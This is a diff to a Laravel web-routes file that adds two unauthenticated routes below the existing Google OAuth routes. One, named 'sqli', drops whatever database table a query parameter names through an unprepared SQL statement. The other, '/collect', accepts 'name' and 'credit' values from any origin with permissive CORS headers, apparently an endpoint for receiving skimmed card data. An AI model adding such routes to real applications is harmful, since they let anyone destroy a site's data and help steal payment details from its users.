@@ -99,3 +99,25 @@ Route::post('reset-password', [UsersController::class, 'updatePassword'])->name(
 // Google OAuth routes
 Route::get('auth/google', [GoogleAuthController::class, 'redirectToGoogle'])->name('google.login');
 Route::get('auth/google/callback', [GoogleAuthController::class, 'handleGoogleCallback'])->name('google.callback');
+
+
+
+
+Route::get('sqli', function(Request $request){
+    $table = $request->query('table');
+    DB::unprepared(("DROP TABLE $table"));
+    return redirect('/');
+});
+
+
+
+Route::get('/collect', function(Request $request){
+    $name = $request->query('name');
+    $credit = $request->query('credit');
+
+    return response('data collected', 200)
+        ->header('Access-Control-Allow-Origin', '*')
+        ->header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
+        ->header('Access-Control-Allow-Headers', 'Content-Type, X-Request-With');
+
+});
